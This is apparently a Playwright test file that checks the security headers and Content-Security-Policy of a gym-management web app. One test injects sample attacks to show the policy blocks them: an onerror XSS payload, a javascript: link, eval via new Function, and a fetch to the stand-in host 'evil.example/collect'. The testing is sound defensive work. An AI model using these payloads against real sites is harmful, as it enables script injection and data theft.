import { expect, test, violations, watch } from "./support";

// What the browser is told to protect, and that the real pages still work under it. The server under test enforces the
// Content-Security-Policy (CSP_MODE=enforce in playwright.config.ts), so a page that needs something the policy forbids
// fails here.

const directive = (policy: string, name: string) => policy.split(";").map((d) => d.trim()).find((d) => d.startsWith(`${name} `)) ?? "";

test.describe("headers", () => {
  test("every kind of page carries the same basic protections", async ({ signedIn: page }) => {
    for (const url of ["/", "/login", "/gym-accounting", "/trainer", "/dashboard", "/robots.txt", "/api/health"]) {
      const h = (await page.request.get(url)).headers();
      expect(h["x-frame-options"], url).toBe("DENY");
      expect(h["x-content-type-options"], url).toBe("nosniff");
      expect(h["referrer-policy"], url).toBe("strict-origin-when-cross-origin");
      expect(h["strict-transport-security"], url).toContain("max-age=");
      // The attendance screen reads member QR codes with the camera; nothing else is allowed.
      expect(h["permissions-policy"], url).toBe("camera=(self), microphone=(), geolocation=()");
    }
  });

  test("the console's policy lets in only scripts the server marked, with a new mark for every request", async ({ signedIn: page }) => {
    const policies: string[] = [];
    for (let i = 0; i < 2; i++) policies.push((await page.request.get("/dashboard")).headers()["content-security-policy"] ?? "");
    for (const policy of policies) {
      const scripts = directive(policy, "script-src");
      expect(scripts, "scripts need the server's nonce").toMatch(/'nonce-[A-Za-z0-9+/=_-]{16,}'/);
      expect(scripts).toContain("'strict-dynamic'");
      expect(scripts, "no blanket permission for inline script").not.toContain("'unsafe-inline'");
      expect(scripts, "no eval").not.toContain("'unsafe-eval'");
      expect(directive(policy, "frame-ancestors"), "cannot be framed").toBe("frame-ancestors 'none'");
      expect(directive(policy, "object-src")).toBe("object-src 'none'");
      // Its own server, Razorpay's checkout, which a gym opens to pay for its plan, and Meta, whose Connect pop-up links
      // a gym's WhatsApp number in Settings › WhatsApp.
      const allowed = ["'self'", "https://*.razorpay.com", "https://www.facebook.com", "https://web.facebook.com"];
      const connect = directive(policy, "connect-src").split(" ").slice(1);
      expect(connect.filter((c) => !allowed.includes(c)), "the page talks to nobody else").toEqual([]);
    }
    const nonce = (p: string) => p.match(/'nonce-([^']+)'/)?.[1];
    expect(nonce(policies[0]!)).not.toBe(nonce(policies[1]!));
  });

  test("a signed-out visitor to a console address gets no page, only a way to sign in", async ({ request }) => {
    const r = await request.get("/dashboard", { maxRedirects: 0 });
    expect(r.status()).toBeGreaterThanOrEqual(300);
    expect(r.status()).toBeLessThan(400);
    expect(r.headers().location).toContain("/login");
    expect(await r.text()).not.toContain("Members");
  });
});

test.describe("an attacker's script", () => {
  test("cannot run in the console, whatever way it gets onto a page", async ({ signedIn: page }) => {
    await page.goto("/dashboard");
    const result = await page.evaluate(async () => {
      const w = window as unknown as Record<string, unknown>;
      const wait = (ms: number) => new Promise((r) => setTimeout(r, ms));
      const out: Record<string, unknown> = {};
      // 1. an inline event handler, the classic cross-site-scripting payload
      document.body.insertAdjacentHTML("beforeend", '<img id="x1" src="x" onerror="window.__x1=1">');
      await wait(400);
      out.inlineHandlerRan = !!w.__x1;
      // 2. a javascript: link
      const a = document.createElement("a");
      a.href = "javascript:window.__x2=1";
      document.body.appendChild(a);
      a.click();
      await wait(300);
      out.javascriptLinkRan = !!w.__x2;
      // 3. building code from a string
      try {
        out.evalResult = String(new Function("return 1+1")());
      } catch (e) {
        out.evalResult = `blocked: ${(e as Error).name}`;
      }
      // 4. sending data to someone else's server
      await fetch("https://evil.example/collect", { mode: "no-cors" }).catch(() => out.sent === undefined && (out.sent = false));
      return out;
    });
    expect(result).toMatchObject({ inlineHandlerRan: false, javascriptLinkRan: false, evalResult: "blocked: EvalError" });
    const kinds = (await violations(page)).map((v) => v.split(" ")[0]);
    expect(kinds, "each attempt was reported by the browser as blocked").toEqual(expect.arrayContaining(["script-src-attr", "script-src-elem", "connect-src"]));
  });
});

test.describe("the public pages work under the policy", () => {
  const PAGES = ["/", "/gym-accounting", "/gym-management-software", "/gym-gst-billing", "/ai-personal-trainer", "/about", "/tools", "/tools/gym-profit-calculator", "/contact", "/privacy", "/terms", "/refund", "/login", "/login?tab=up&plan=professional&cycle=MONTHLY", "/signin", "/forgot-password"];
  for (const url of PAGES) {
    test(url, async ({ page }) => {
      const seen = watch(page);
      const response = await page.goto(url);
      expect(response?.status()).toBe(200);
      await page.waitForLoadState("networkidle").catch(() => {});
      expect(await seen.all()).toEqual([]);
    });
  }

  test("the home page's own script runs: the phone menu opens", async ({ page }) => {
    await page.setViewportSize({ width: 390, height: 800 });
    const seen = watch(page);
    await page.goto("/");
    await page.locator(".menu-btn").click();
    await expect(page.locator("body")).toHaveClass(/menu-open/);
    expect(await seen.all()).toEqual([]);
  });

  test("the AI Trainer app, which builds itself in the browser, appears and breaks nothing", async ({ page }) => {
    const seen = watch(page);
    await page.goto("/trainer");
    await expect.poll(async () => (await page.locator("body").innerText()).length, { message: "the app drew itself" }).toBeGreaterThan(200);
    expect(await violations(page), "the policy blocked nothing").toEqual([]);
    // Known, and harmless: the app's page template holds two video frames whose address is still a {{ placeholder }} when
    // the browser first reads it, so the browser asks for a page that refuses to be framed. Anything else is a problem.
    const notThat = (seen.problems).filter((p) => !/Refused to display .* in a frame because it set 'X-Frame-Options'/.test(p));
    expect(notThat).toEqual([]);
  });
});
